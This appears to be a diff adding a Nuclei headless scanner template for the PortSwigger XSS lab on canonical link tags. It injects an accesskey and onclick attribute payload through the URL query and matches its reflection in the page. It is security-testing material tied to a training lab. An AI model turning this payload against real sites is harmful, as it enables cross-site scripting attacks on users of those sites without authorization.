@@ -1,0 +1,30 @@
+# run with flag $ nuclei -headless
+
+id: lab-canonical-link-tag
+
+info:
+  name: xss_lab-canonical-link-tag
+  author: FIR_UIII
+  severity: high
+  description: XSS injection attack
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?%27accesskey=%27x%27onclick%3D%27alert%283%2B4%29"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers-condition: and
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - accesskey="x" onclick="alert(3+4)">
+      - type: status
+        status:
+          - 200
